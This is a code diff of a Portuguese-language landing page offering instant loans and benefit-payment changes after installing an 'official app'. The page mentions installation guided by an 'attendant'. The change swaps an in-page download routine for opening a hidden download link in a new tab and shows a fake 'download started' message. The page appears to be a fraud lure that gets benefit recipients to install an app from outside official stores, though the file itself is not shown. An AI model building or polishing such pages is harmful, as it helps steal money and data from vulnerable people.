@@ -64,7 +64,6 @@
       </h2>
       <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-8 text-lg text-gray-700">
         <div class="card p-8 flex flex-col items-center text-center">
-          
           <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
           </svg>
@@ -72,7 +71,6 @@
           <p>Solicite crédito e empréstimos imediatamente após a instalação do app oficial.</p>
         </div>
         <div class="card p-8 flex flex-col items-center text-center">
-          
           <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
             <path d="M19 3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8.58 10 17z"/>
           </svg>
@@ -80,7 +78,6 @@
           <p>Altere o recebimento do seu benefício para a instituição que preferir, sem burocracia.</p>
         </div>
         <div class="card p-8 flex flex-col items-center text-center">
-          
           <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 text-blue-600 mb-4" viewBox="0 0 24 24" fill="currentColor">
             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2z"/>
           </svg>
@@ -92,7 +89,6 @@
 
     <!-- Imagem antes do Botão de Download -->
     <div class="card p-4">
-      
       <img src="https://i.imgur.com/jw3ObZf.png" alt="Processo de instalação segura via atendente" class="rounded-2xl mx-auto w-full">
     </div>
 
@@ -180,63 +176,19 @@
     const progressContainer = document.getElementById('progressContainer');
     const progressBar = document.getElementById('progressBar');
 
-    downloadButton.addEventListener('click', async () => {
-      // Impede múltiplos cliques
-      if (downloadButton.disabled) return;
+    downloadButton.addEventListener('click', () => {
+      // Mostra que foi clicado
       downloadButton.disabled = true;
+      buttonText.textContent = "Redirecionando...";
+      downloadButton.classList.add("bg-green-600");
 
-      buttonText.textContent = 'Baixando...';
-      progressContainer.classList.remove('hidden');
+      // Abre o link em nova aba
+      window.open(downloadUrl, "_blank");
 
-      try {
-        const response = await fetch(downloadUrl);
-        if (!response.ok) throw new Error("Erro no download");
-
-        const contentLength = response.headers.get("content-length");
-        if (!contentLength) throw new Error("Tamanho do arquivo desconhecido");
-
-        const total = parseInt(contentLength, 10);
-        let loaded = 0;
-
-        const reader = response.body.getReader();
-        const chunks = [];
-
-        while (true) {
-          const { done, value } = await reader.read();
-          if (done) break;
-          chunks.push(value);
-          loaded += value.length;
-
-          const progress = Math.round((loaded / total) * 100);
-          progressBar.style.width = progress + "%";
-          progressBar.textContent = progress + "%";
-        }
-
-        const blob = new Blob(chunks);
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = fileName;
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-
-        buttonText.textContent = "Download concluído!";
-        progressBar.style.width = "100%";
-        progressBar.textContent = "100%";
-
-        setTimeout(() => {
-          window.URL.revokeObjectURL(url);
-          downloadButton.disabled = false;
-        }, 2000);
-
-      } catch (err) {
-        buttonText.textContent = "Erro ao baixar";
-        progressBar.style.backgroundColor = "red";
-        progressBar.textContent = "Falhou";
-        downloadButton.disabled = false;
-        console.error("Erro no download:", err);
-      }
+      // Marca como concluído após clique
+      setTimeout(() => {
+        buttonText.textContent = "Download Iniciado!";
+      }, 1500);
     });
   </script>
 
